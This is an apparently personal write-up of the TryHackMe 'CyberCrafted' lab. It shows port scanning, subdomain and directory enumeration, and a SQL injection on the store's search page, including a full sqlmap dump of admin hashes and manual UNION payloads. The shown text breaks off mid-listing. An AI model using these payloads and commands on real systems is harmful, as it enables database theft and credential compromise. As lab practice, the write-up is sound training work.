----
Pwn this pay-to-win Minecraft server!
---
![](https://m4dr1nch.github.io/writeups/cybercrafted/assets/img/cc-banner.png)

![111](https://tryhackme-images.s3.amazonaws.com/room-icons/dd06737472c79a806e2049ddeb3af354.png)

###  Deploy the machine

 Start Machine

Connect to the TryHackMe network and deploy the machine. If you do not know how to connect to the VPN, please complete the [OpenVPN](https://tryhackme.com/room/openvpn) room or use the AttackBox by clicking the Start AttackBox button.

_Note that this machine may take a couple of minutes to boot up. I would recommend giving it at least five minutes._

Answer the questions below

Ready.. Set...

Correct Answer

Go

### Root it

You have found an IP address of an in-development Minecraft server. Can you **root** it?

![](https://m4dr1nch.github.io/writeups/cybercrafted/assets/img/cc-logo.png)  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.88.215 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.88.215:22
Open 10.10.88.215:80
Open 10.10.88.215:25565
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 11:30 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:30
Completed Parallel DNS resolution of 1 host. at 11:30, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:30
Scanning 10.10.88.215 [3 ports]
Discovered open port 22/tcp on 10.10.88.215
Discovered open port 80/tcp on 10.10.88.215
Discovered open port 25565/tcp on 10.10.88.215
Completed Connect Scan at 11:30, 0.23s elapsed (3 total ports)
Initiating Service scan at 11:30
Scanning 3 services on 10.10.88.215
Completed Service scan at 11:30, 6.43s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.88.215.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:30
Completed NSE at 11:30, 5.40s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:30
Completed NSE at 11:30, 0.74s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
Nmap scan report for 10.10.88.215
Host is up, received user-set (0.22s latency).
Scanned at 2023-03-08 11:30:09 EST for 13s

PORT      STATE SERVICE   REASON  VERSION
22/tcp    open  ssh       syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3736ceb9ac728ad7a6b78e45d0ce3c00 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk3jETo4Cogly65TvK7OYID0jjr/NbNWJd1TvT3mpDonj9KkxJ1oZ5xSBy+3hOHwDcS0FG7ZpFe8BNwe/ASjD91/TL/a1gH6OPjkZblyc8FM5pROz0Mn1JzzB/oI+rHIaltq8JwTxJMjTt1qjfjf3yqHcEA5zLLrUr+a47vkvhYzbDnrWEMPXJ5w9V2EUxY9LUu0N8eZqjnzr1ppdm3wmC4li/hkKuzkqEsdE4ENGKz322l2xyPNEoaHhEDmC94LTp1FcR4ceeGQ56WzmZe6CxkKA3iPz55xSd5Zk0XTZLTarYTMqxxe+2cRAgqnCtE1QsE7cX4NA/E90EcmBnJh5T
|   256 e9e7338a77282cd48c6d8a2ce7889530 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLntlbdcO4xygQVgz6dRRx15qwlCojOYACYTiwta7NFXs9M2d2bURHdM1dZJBPh5pS0V69u0snOij/nApGU5AZo=
|   256 76a2b1cf1b3dce6c60f563243eef70d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDbLLQOGt+qbIb4myX/Z/sYQ7cj20+ssISzpZCaMD4/u
80/tcp    open  http      syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://cybercrafted.thm/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
25565/tcp open  minecraft syn-ack Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.20 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ tail /etc/hosts      
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.88.215 cybercrafted.thm

view-source:http://cybercrafted.thm/

<!-- A Note to the developers: Just finished up adding other subdomains, now you can work on them! -->

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster vhost -u http://cybercrafted.thm/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -t 64  
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://cybercrafted.thm/
[+] Method:          GET
[+] Threads:         64
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.4
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/03/08 11:50:16 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.cybercrafted.thm Status: 200 [Size: 937]
Found: store.cybercrafted.thm Status: 403 [Size: 287]
Found: www.admin.cybercrafted.thm Status: 200 [Size: 937]
Found: www.store.cybercrafted.thm Status: 403 [Size: 291]
Found: gc._msdcs.cybercrafted.thm Status: 400 [Size: 301]
Progress: 1447 / 114442 (1.26%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/03/08 11:50:23 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ tail /etc/hosts     
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.88.215 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm

                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://admin.cybercrafted.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.cybercrafted.thm/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,html,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/03/08 12:00:15 Starting gobuster in directory enumeration mode
===============================================================
http://admin.cybercrafted.thm/.php                 (Status: 403) [Size: 287]
http://admin.cybercrafted.thm/.html                (Status: 403) [Size: 287]
http://admin.cybercrafted.thm/login.php            (Status: 302) [Size: 0] [--> /]
http://admin.cybercrafted.thm/index.php            (Status: 200) [Size: 937]
http://admin.cybercrafted.thm/assets               (Status: 301) [Size: 333] [--> http://admin.cybercrafted.thm/assets/]
http://admin.cybercrafted.thm/panel.php            (Status: 302) [Size: 0] [--> /]
http://admin.cybercrafted.thm/.html                (Status: 403) [Size: 287]
http://admin.cybercrafted.thm/.php                 (Status: 403) [Size: 287]
Progress: 181361 / 882244 (20.56%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/03/08 12:09:16 Finished
===============================================================
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://store.cybercrafted.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.cybercrafted.thm/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,html,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/03/08 12:09:26 Starting gobuster in directory enumeration mode
===============================================================
http://store.cybercrafted.thm/index.html           (Status: 403) [Size: 287]
http://store.cybercrafted.thm/.html                (Status: 403) [Size: 287]
http://store.cybercrafted.thm/.php                 (Status: 403) [Size: 287]
http://store.cybercrafted.thm/search.php           (Status: 200) [Size: 838]
http://store.cybercrafted.thm/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]
^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/03/08 12:09:31 Finished
===============================================================

http://store.cybercrafted.thm/search.php

' or '1'='1

' or 1='1

and we dump all the products

now using sqlmap then manually

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u http://store.cybercrafted.thm/search.php --forms --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:44:37 /2023-03-08/

[12:44:37] [INFO] testing connection to the target URL
[12:44:38] [INFO] searching for forms
[1/1] Form:
POST http://store.cybercrafted.thm/search.php
POST data: search=&submit=
do you want to test this form? [Y/n/q] 
> Y

do you want to fill blank fields with random values? [Y/n] 
[12:44:47] [INFO] using '/home/witty/.local/share/sqlmap/output/results-03082023_1244pm.csv' as the CSV results file in multiple targets mode
[12:44:47] [INFO] testing if the target URL content is stable
[12:44:48] [INFO] target URL content is stable
[12:44:48] [INFO] testing if POST parameter 'search' is dynamic
[12:44:48] [WARNING] POST parameter 'search' does not appear to be dynamic
[12:44:48] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[12:44:49] [INFO] testing for SQL injection on POST parameter 'search'
[12:44:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:44:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:44:52] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:44:53] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:44:54] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:44:56] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:44:57] [INFO] testing 'Generic inline queries'
[12:44:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:44:58] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:44:59] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:45:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:45:11] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[12:45:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:45:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:45:22] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[12:45:23] [INFO] target URL appears to have 4 columns in query
[12:45:24] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
[12:45:34] [INFO] testing if POST parameter 'submit' is dynamic
[12:45:34] [WARNING] POST parameter 'submit' does not appear to be dynamic
[12:45:34] [WARNING] heuristic (basic) test shows that POST parameter 'submit' might not be injectable
[12:45:34] [INFO] testing for SQL injection on POST parameter 'submit'
[12:45:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:45:36] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:45:36] [INFO] testing 'Generic inline queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[12:45:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:45:53] [WARNING] POST parameter 'submit' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 118 HTTP(s) requests:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=VcYe' AND (SELECT 1466 FROM (SELECT(SLEEP(5)))IIWF) AND 'JIga'='JIga&submit=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: search=VcYe' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x415254504c756449536e504947674b4e794f4772454b476c6d5a49527157476f4846706f76514e48,0x716b766271)-- -&submit=
---
do you want to exploit this SQL injection? [Y/n] Y
[12:46:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[12:46:09] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[12:46:09] [INFO] fetching current database
[12:46:09] [INFO] fetching tables for database: 'webapp'
[12:46:09] [INFO] fetching columns for table 'admin' in database 'webapp'
[12:46:10] [INFO] fetching entries for table 'admin' in database 'webapp'
[12:46:10] [INFO] recognized possible password hashes in column 'hash'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] Y
[12:46:19] [INFO] writing hashes to a temporary file '/tmp/sqlmapgfp1knxu1879998/sqlmaphashes-xceo54w9.txt' 
do you want to crack them via a dictionary-based attack? [y/N/q] N
Database: webapp
Table: admin
[2 entries]
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 | xXUltimateCreeperXx |
| 4  | THM{bbe315906038c3a62d9b195001f75008}    | web_flag            |
+----+------------------------------------------+---------------------+

[12:46:29] [INFO] table 'webapp.admin' dumped to CSV file '/home/witty/.local/share/sqlmap/output/store.cybercrafted.thm/dump/webapp/admin.csv'
[12:46:29] [INFO] fetching columns for table 'stock' in database 'webapp'
[12:46:30] [INFO] fetching entries for table 'stock' in database 'webapp'
Database: webapp
Table: stock
[139 entries]
+-----+------+------------------------+--------+
| id  | cost | item                   | amount |
+-----+------+------------------------+--------+
| 4   | 0.5$ | Acacia Boat            | 1x     |
| 5   | 0.5$ | Armor Stand            | 1x     |
| 6   | 0.2$ | Beetroot Seeds         | 16x    |
| 7   | 0.5$ | Birch Boat             | 1x     |
| 8   | 1$   | Bottle of Enchanting   | 64x    |
| 9   | 0.5$ | Bow                    | 1x     |
| 10  | 0.2$ | Bucket                 | 1x     |
| 11  | 0.1$ | Carrot                 | 64x    |
| 12  | 0.4$ | Cocoa Beans            | 64     |
| 13  | 0.5$ | Crossbow               | 1x     |
| 14  | 0.5$ | Dark Oak Boat          | 1x     |
| 15  | 0.1$ | Egg                    | 16x    |
| 16  | 5$   | End Crystal            | 1x     |
| 17  | 1$   | Ender Pearl            | 16     |
| 18  | 2$   | Eye of Ender           | 16x    |
| 19  | 1$   | Fire Charge            | 16x    |
| 20  | 0.8$ | Firework Rocket        | 16x    |
| 21  | 0.2$ | Fishing Rod            | 1x     |
| 22  | 0.2$ | Flint and Steel        | 1x     |
| 23  | 0.2$ | Glow Berries           | 16x    |
| 24  | 0.1$ | Glow Item Frame        | 1x     |
| 25  | 0.1$ | Item Frame             | 1x     |
| 26  | 0.5$ | Jungle Boat            | 1x     |
| 27  | 0.1$ | Kelp                   | 64x    |
| 28  | 0.5$ | Lava Bucket            | 1x     |
| 29  | 0.6$ | Lead                   | 1x     |
| 30  | 2$   | Lingering Potion       | 16x    |
| 31  | 0.8$ | Melon Seeds            | 64x    |
| 32  | 0.8$ | Minecart               | 1x     |
| 33  | 1$   | Nether Wart            | 16x    |
| 34  | 0.5$ | Oak Boat               | 1x     |
| 35  | 0.2$ | Painting               | 1x     |
| 36  | 1$   | Potato                 | 64x    |
| 37  | 2$   | Redstone Dust          | 64x    |
| 38  | 0.4$ | Snowball               | 16x    |
| 39  | 0.1$ | Splash Potion          | 1x     |
| 40  | 0.5$ | Spruce Boat            | 1x     |
| 41  | 1$   | String                 | 64x    |
| 42  | 5$   | Trident                | 1x     |
| 43  | 0.5$ | Water Bucket           | 1x     |
| 44  | 0.5$ | Wheat Seeds            | 64x    |
| 45  | 2$   | Arrow                  | 64x    |
| 46  | 1$   | Bone                   | 64x    |
| 47  | 0.4$ | Bone Meal              | 64x    |
| 48  | 0.5$ | Bowl                   | 16x    |
| 49  | 2$   | Bread                  | 64x    |
| 50  | 1$   | Chainmail Boots        | 1x     |
| 51  | 1.5$ | Chainmail Chestplate   | 1x     |
| 52  | 1$   | Chainmail Helmet       | 1x     |
| 53  | 1.2$ | Chainmail Leggings     | 1x     |
| 54  | 0.5$ | Compass                | 1x     |
| 55  | 1$   | Cooked Chicken         | 64x    |
| 56  | 1$   | Cooked Cod             | 64x    |
| 57  | 1$   | Cooked Mutton          | 64x    |
| 58  | 1$   | Cooked Porkchop        | 64x    |
| 59  | 1$   | Cooked Rabbit          | 64x    |
| 60  | 1$   | Cooked Salmon          | 64x    |
| 61  | 2$   | Diamond Axe            | 1x     |
| 62  | 4$   | Diamond Boots          | 1x     |
| 63  | 6$   | Diamond Chestplate     | 1x     |
| 64  | 2$   | Diamond Helmet         | 1x     |
| 65  | 1$   | Diamond Hoe            | 1x     |
| 66  | 2$   | Diamond Horse Armor    | 1x     |
| 67  | 5$   | Diamond Leggings       | 1x     |
| 68  | 3$   | Diamond Pickaxe        | 1x     |
| 69  | 2$   | Diamond Shovel         | 1x     |
| 70  | 4$   | Diamond Sword          | 1x     |
| 71  | 8$   | Elytra                 | 1x     |
| 72  | 150$ | Enchanted Golden Apple | 64x    |
| 73  | 5$   | Golden Apple           | 64x    |
| 74  | 1$   | Golden Axe             | 1x     |
| 75  | 2$   | Golden Boots           | 1x     |
| 76  | 4$   | Golden Carrot          | 64x    |
| 77  | 2$   | Golden Chestplate      | 1x     |
| 78  | 1$   | Golden Helmet          | 1x     |
| 79  | 0.5$ | Golden Hoe             | 1x     |
| 80  | 0.5$ | Golden Horse Armor     | 1x     |
| 81  | 0.5$ | Golden Leggings        | 1x     |
| 82  | 0.5$ | Golden Pickaxe         | 1x     |
| 83  | 0.5$ | Golden Shovel          | 1x     |
| 84  | 0.5$ | Golden Sword           | 1x     |
| 85  | 1$   | Iron Axe               | 1x     |
| 86  | 1.5$ | Iron Boots             | 1x     |
| 87  | 3$   | Iron Chestplate        | 1x     |
| 88  | 1$   | Iron Helmet            | 1x     |
| 89  | 0.5$ | Iron Hoe               | 1x     |
| 90  | 2$   | Iron Horse Armor       | 1x     |
| 91  | 2$   | Iron Leggings          | 1x     |
| 92  | 1$   | Iron Pickaxe           | 1x     |
| 93  | 0.8$ | Iron Shovel            | 1x     |
| 94  | 1$   | Iron Sword             | 1x     |
| 95  | 5$   | Lapis Lazuli           | 64x    |
| 96  | 0.2$ | Milk Bucket            | 1x     |
| 97  | 1$   | Mushroom Stew          | 16x    |
| 98  | 4$   | Name Tag               | 16x    |
| 99  | 5$   | Netherite Axe          | 1x     |
| 100 | 6$   | Netherite Boots        | 1x     |
| 101 | 10$  | Netherite Chestplate   | 1x     |
| 102 | 4$   | Netherite Helmet       | 1x     |
| 103 | 6    | Netherite Hoe          | 1x     |
| 104 | 8$   | Netherite Leggings     | 1x     |
| 105 | 5$   | Netherite Pickaxe      | 1x     |
| 106 | 5$   | Netherite Shovel       | 1x     |
| 107 | 5$   | Netherite Sword        | 1x     |
| 108 | 1$   | Saddle                 | 1x     |
| 109 | 0.5$ | Shears                 | 1x     |
| 110 | 0.5$ | Shield                 | 1x     |
| 111 | 1$   | Sugar                  | 64x    |
| 112 | 4$   | Suspicious Stew        | 1x     |
| 113 | 4$   | Tipped Arrow           | 16x    |
| 114 | 5$   | Totem of Undying       | 1x     |
| 115 | 0.2$ | Tropical Fish          | 1x     |
| 116 | 4$   | Turtle Shell           | 16x    |
| 117 | 2$   | Wheat                  | 64x    |
| 118 | 2$   | Amethyst Shard         | 16x    |
| 119 | 5$   | Blaze Powder           | 64x    |
| 120 | 5$   | Blaze Rod              | 32x    |
| 121 | 1$   | Clock                  | 1x     |
| 122 | 3$   | Coal                   | 64x    |
| 123 | 5$   | Copper Ingot           | 64x    |
| 124 | 20$  | Diamond                | 64x    |
| 125 | 20$  | Emerald                | 64x    |
| 126 | 2$   | Flint                  | 64x    |
| 127 | 10$  | Ghast Tear             | 64x    |
| 128 | 5$   | Glowstone Dust         | 64x    |
| 129 | 5$   | Gunpowder              | 64x    |
| 130 | 4$   | Heart of the Sea       | 1x     |
| 131 | 10$  | Iron Ingot             | 64x    |
| 132 | 2$   | Lapis Lazuli           | 64x    |
| 133 | 2$   | Nautilus Shell         | 16x    |
| 134 | 1$   | Nether Brick           | 64x    |
| 135 | 8$   | Nether Quartz          | 64x    |
| 136 | 10$  | Nether Star            | 1x     |
| 137 | 500$ | Netherite Ingot        | 64x    |
| 138 | 50$  | Netherite Scrap        | 64x    |
| 139 | 5$   | Raw Gold               | 64x    |
| 140 | 5$   | Raw Iron               | 64x    |
| 141 | 2$   | Shulker Shell          | 16x    |
| 142 | 1$   | Slimeball              | 16x    |
+-----+------+------------------------+--------+

[12:46:30] [INFO] table 'webapp.stock' dumped to CSV file '/home/witty/.local/share/sqlmap/output/store.cybercrafted.thm/dump/webapp/stock.csv'
[12:46:30] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 29 times
[12:46:30] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/witty/.local/share/sqlmap/output/results-03082023_1244pm.csv'

[*] ending @ 12:46:30 /2023-03-08/

' OR 1=1-- -
we search by a word that doesn't exist
adasd' union select 1,2,3,4 #
adasd' union select 1,2,3,database() #

there are 2 ways to dump all the tables names 

adada' union select 1,2,3,table_name from information_schema.tables # 

2 	3 	CHARACTER_SETS
2 	3 	COLLATIONS
2 	3 	COLLATION_CHARACTER_SET_APPLICABILITY
2 	3 	COLUMNS
2 	3 	COLUMN_PRIVILEGES
2 	3 	ENGINES
2 	3 	EVENTS
2 	3 	FILES
2 	3 	GLOBAL_STATUS
2 	3 	GLOBAL_VARIABLES
2 	3 	KEY_COLUMN_USAGE
2 	3 	OPTIMIZER_TRACE
2 	3 	PARAMETERS
2 	3 	PARTITIONS
2 	3 	PLUGINS
2 	3 	PROCESSLIST
2 	3 	PROFILING
2 	3 	REFERENTIAL_CONSTRAINTS
2 	3 	ROUTINES
2 	3 	SCHEMATA
2 	3 	SCHEMA_PRIVILEGES
2 	3 	SESSION_STATUS
2 	3 	SESSION_VARIABLES
2 	3 	STATISTICS
2 	3 	TABLES
2 	3 	TABLESPACES
2 	3 	TABLE_CONSTRAINTS
2 	3 	TABLE_PRIVILEGES
2 	3 	TRIGGERS
2 	3 	USER_PRIVILEGES
2 	3 	VIEWS
2 	3 	INNODB_LOCKS
2 	3 	INNODB_TRX
2 	3 	INNODB_SYS_DATAFILES
2 	3 	INNODB_FT_CONFIG
2 	3 	INNODB_SYS_VIRTUAL
2 	3 	INNODB_CMP
2 	3 	INNODB_FT_BEING_DELETED
2 	3 	INNODB_CMP_RESET
2 	3 	INNODB_CMP_PER_INDEX
2 	3 	INNODB_CMPMEM_RESET
2 	3 	INNODB_FT_DELETED
2 	3 	INNODB_BUFFER_PAGE_LRU
2 	3 	INNODB_LOCK_WAITS
2 	3 	INNODB_TEMP_TABLE_INFO
2 	3 	INNODB_SYS_INDEXES
2 	3 	INNODB_SYS_TABLES
2 	3 	INNODB_SYS_FIELDS
2 	3 	INNODB_CMP_PER_INDEX_RESET
2 	3 	INNODB_BUFFER_PAGE
2 	3 	INNODB_FT_DEFAULT_STOPWORD
2 	3 	INNODB_FT_INDEX_TABLE
2 	3 	INNODB_FT_INDEX_CACHE
2 	3 	INNODB_SYS_TABLESPACES
2 	3 	INNODB_METRICS
2 	3 	INNODB_SYS_FOREIGN_COLS
2 	3 	INNODB_CMPMEM
2 	3 	INNODB_BUFFER_POOL_STATS
2 	3 	INNODB_SYS_COLUMNS
2 	3 	INNODB_SYS_FOREIGN
2 	3 	INNODB_SYS_TABLESTATS
2 	3 	columns_priv
2 	3 	db
2 	3 	engine_cost
2 	3 	event
2 	3 	func
2 	3 	general_log
2 	3 	gtid_executed
2 	3 	help_category
2 	3 	help_keyword
2 	3 	help_relation
2 	3 	help_topic
2 	3 	innodb_index_stats
2 	3 	innodb_table_stats
2 	3 	ndb_binlog_index
2 	3 	plugin
2 	3 	proc
2 	3 	procs_priv
2 	3 	proxies_priv
2 	3 	server_cost
2 	3 	servers
2 	3 	slave_master_info
2 	3 	slave_relay_log_info
2 	3 	slave_worker_info
2 	3 	slow_log
2 	3 	tables_priv
2 	3 	time_zone
2 	3 	time_zone_leap_second
2 	3 	time_zone_name
2 	3 	time_zone_transition
2 	3 	time_zone_transition_type
2 	3 	user
2 	3 	accounts
2 	3 	cond_instances
2 	3 	events_stages_current
2 	3 	events_stages_history
2 	3 	events_stages_history_long
2 	3 	events_stages_summary_by_account_by_event_name
2 	3 	events_stages_summary_by_host_by_event_name
2 	3 	events_stages_summary_by_thread_by_event_name
2 	3 	events_stages_summary_by_user_by_event_name
2 	3 	events_stages_summary_global_by_event_name
2 	3 	events_statements_current
2 	3 	events_statements_history
2 	3 	events_statements_history_long
2 	3 	events_statements_summary_by_account_by_event_name
2 	3 	events_statements_summary_by_digest
2 	3 	events_statements_summary_by_host_by_event_name
2 	3 	events_statements_summary_by_program
2 	3 	events_statements_summary_by_thread_by_event_name
2 	3 	events_statements_summary_by_user_by_event_name
2 	3 	events_statements_summary_global_by_event_name
2 	3 	events_transactions_current
2 	3 	events_transactions_history
2 	3 	events_transactions_history_long
2 	3 	events_transactions_summary_by_account_by_event_name
2 	3 	events_transactions_summary_by_host_by_event_name
2 	3 	events_transactions_summary_by_thread_by_event_name
2 	3 	events_transactions_summary_by_user_by_event_name
2 	3 	events_transactions_summary_global_by_event_name
2 	3 	events_waits_current
2 	3 	events_waits_history
2 	3 	events_waits_history_long
2 	3 	events_waits_summary_by_account_by_event_name
2 	3 	events_waits_summary_by_host_by_event_name
2 	3 	events_waits_summary_by_instance
2 	3 	events_waits_summary_by_thread_by_event_name
2 	3 	events_waits_summary_by_user_by_event_name
2 	3 	events_waits_summary_global_by_event_name
2 	3 	file_instances
2 	3 	file_summary_by_event_name
2 	3 	file_summary_by_instance
2 	3 	host_cache
2 	3 	hosts
2 	3 	memory_summary_by_account_by_event_name
2 	3 	memory_summary_by_host_by_event_name
2 	3 	memory_summary_by_thread_by_event_name
2 	3 	memory_summary_by_user_by_event_name
2 	3 	memory_summary_global_by_event_name
2 	3 	metadata_locks
2 	3 	mutex_instances
2 	3 	objects_summary_global_by_type
2 	3 	performance_timers
2 	3 	prepared_statements_instances
2 	3 	replication_applier_configuration
2 	3 	replication_applier_status
2 	3 	replication_applier_status_by_coordinator
2 	3 	replication_applier_status_by_worker
2 	3 	replication_connection_configuration
2 	3 	replication_connection_status
2 	3 	replication_group_member_stats
2 	3 	replication_group_members
2 	3 	rwlock_instances
